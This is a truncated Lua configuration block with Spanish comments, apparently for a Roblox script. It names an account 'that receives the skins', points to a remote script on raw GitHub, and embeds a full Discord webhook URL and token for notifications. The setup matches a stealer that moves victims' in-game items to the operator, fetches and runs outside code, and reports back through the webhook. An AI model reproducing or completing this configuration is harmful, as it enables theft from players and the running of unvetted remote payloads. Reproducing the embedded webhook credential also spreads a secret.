local CONFIG = {
    ...
    TARGET_NAME   = "heyesoesmio", -- username de la cuenta que recibe las skins
    ...
    THREE_SCRIPT_URL = "https://raw.githubusercontent.com/rysted-rbx/free/main/dmvs",

    -- (OPCIONAL) webhook de Discord para notificaciones, dejar vacio para desactivar
    WEBHOOK = {
        URL  = "https://discord.com/api/webhooks/1549489269951692811/Ms19wYRZw0IIp-XF9AF5Gr-lON0l9_5oSVHS3rZMuZGic_lShD9h9h7QAX2ClFKHVUEK", -- "https://discord.com/api/webhooks/" webhook de Discord
